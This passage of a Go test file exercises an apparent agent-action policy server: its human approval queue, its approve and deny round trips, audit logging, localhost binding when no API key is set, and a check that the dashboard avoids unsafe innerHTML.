	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

func TestApprovalQueue_ResolveRemovesFromList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if err := q.Resolve(pa.ID, policy.Allow); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// Resolved actions should not appear in List()
	list := q.List()
	if len(list) != 0 {
		t.Errorf("expected 0 pending after resolve, got %d", len(list))
	}
}

func TestApprovalQueue_EvictsResolved(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	// Add and resolve entries to fill the map
	for i := 0; i < MaxPendingApprovals; i++ {
		pa := mustAdd(t, q,
			policy.ActionRequest{Scope: "shell", Command: "sudo test"},
			policy.CheckResult{Decision: policy.RequireApproval},
		)
		_ = q.Resolve(pa.ID, policy.Allow)
	}

	// Map should be at capacity (resolved entries are still in the map)
	q.mu.RLock()
	sizeBefore := len(q.pending)
	q.mu.RUnlock()
	if sizeBefore != MaxPendingApprovals {
		t.Fatalf("expected %d entries before eviction, got %d", MaxPendingApprovals, sizeBefore)
	}

	// Adding one more should trigger eviction of resolved entries
	mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo new"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	q.mu.RLock()
	sizeAfter := len(q.pending)
	q.mu.RUnlock()

	// All resolved entries evicted, only the new one remains
	if sizeAfter != 1 {
		t.Errorf("expected 1 entry after eviction, got %d", sizeAfter)
	}
}

func TestApprovalQueue_ResolveNotFound(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	err := q.Resolve("ap_nonexistent", policy.Allow)
	if err == nil {
		t.Error("expected error for non-existent ID")
	}
}

func TestApprovalQueue_SSEBroadcast(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	ch := q.Subscribe()
	defer q.Unsubscribe(ch)

	// Add should trigger a broadcast via Resolve
	pa := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = q.Resolve(pa.ID, policy.Allow)

	select {
	case event := <-ch:
		if event.Type != "resolved" {
			t.Errorf("expected resolved event, got %s", event.Type)
		}
	case <-time.After(time.Second):
		t.Error("expected SSE event within 1 second")
	}
}

// --- Full round-trip: check → approve → status ---

func TestFullApprovalRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo reboot","agent_id":"agent-1"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	if checkResult.Decision != policy.RequireApproval {
		t.Fatalf("step 1: expected REQUIRE_APPROVAL, got %s", checkResult.Decision)
	}

	approvalID := checkResult.ApprovalID

	// Step 2: Poll status — should be pending
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var statusResp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&statusResp)
	if statusResp["status"] != "pending" {
		t.Fatalf("step 2: expected pending, got %s", statusResp["status"])
	}

	// Step 3: Approve
	approveReq := httptest.NewRequest(http.MethodPost, "/v1/approve/"+approvalID, nil)
	approveReq.Header.Set("Authorization", "Bearer test-secret")
	approveW := httptest.NewRecorder()
	srv.handleApprove(approveW, approveReq)

	if approveW.Code != http.StatusOK {
		t.Fatalf("step 3: expected 200, got %d", approveW.Code)
	}

	// Step 4: Poll status — should be resolved
	statusReq2 := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW2 := httptest.NewRecorder()
	srv.handleStatus(statusW2, statusReq2)

	statusResp2 := map[string]string{}
	_ = json.NewDecoder(statusW2.Body).Decode(&statusResp2)
	if statusResp2["status"] != "resolved" {
		t.Fatalf("step 4: expected resolved, got %s", statusResp2["status"])
	}
	if statusResp2["decision"] != "ALLOW" {
		t.Fatalf("step 4: expected ALLOW, got %s", statusResp2["decision"])
	}

	// Step 5: Verify audit log has the entry
	auditReq := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=agent-1", nil)
	auditW := httptest.NewRecorder()
	srv.handleAuditQuery(auditW, auditReq)

	var auditEntries []audit.Entry
	_ = json.NewDecoder(auditW.Body).Decode(&auditEntries)
	if len(auditEntries) < 1 {
		t.Error("step 5: expected at least 1 audit entry for agent-1")
	}
}

// --- Full round-trip: check → deny → status ---

func TestFullDenyRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo halt","agent_id":"agent-2"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	approvalID := checkResult.ApprovalID

	// Step 2: Deny
	denyReq := httptest.NewRequest(http.MethodPost, "/v1/deny/"+approvalID, nil)
	denyReq.Header.Set("Authorization", "Bearer test-secret")
	denyW := httptest.NewRecorder()
	srv.handleDeny(denyW, denyReq)

	if denyW.Code != http.StatusOK {
		t.Fatalf("deny: expected 200, got %d", denyW.Code)
	}

	// Step 3: Status should be denied
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var resp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&resp)
	if resp["decision"] != "DENY" {
		t.Errorf("expected DENY, got %s", resp["decision"])
	}
}

// --- Verify localhost binding when no API key ---

func TestNewServer_LocalhostBindingWithoutAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngine(pol),
		Logger:  logger,
		APIKey:  "", // No API key
		Version: "test",
	})

	if !strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("without API key, should bind to 127.0.0.1, got %s", srv.http.Addr)
	}
}

func TestNewServer_AllInterfaceBindingWithAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngine(pol),
		Logger:  logger,
		APIKey:  "my-secret",
		Version: "test",
	})

	if strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("with API key, should bind to all interfaces, got %s", srv.http.Addr)
	}
}

// --- Verify XSS mitigation in dashboard ---

func TestDashboard_NoUnsafeInnerHTML(t *testing.T) {
	// Ensure the dashboard HTML doesn't use innerHTML for user-controlled data.
	// Safe patterns: textContent, createElement, esc() helper.
	// Unsafe pattern: .innerHTML = ` (template literal with interpolation)
	if strings.Contains(dashboardHTML, ".innerHTML = `") {
		t.Error("dashboard contains .innerHTML with template literal — XSS risk")
	}

	// Check that the esc() helper exists
	if !strings.Contains(dashboardHTML, "function esc(") {
		t.Error("dashboard should contain esc() HTML escaping helper")
	}

	// Check that textContent is used
	if !strings.Contains(dashboardHTML, "textContent") {
		t.Error("dashboard should use textContent for safe text insertion")
	}
}

// --- Edge case: empty body ---

func TestHandleCheck_EmptyBody(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", bytes.NewReader(nil))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for empty body, got %d", w.Code)
	}
}
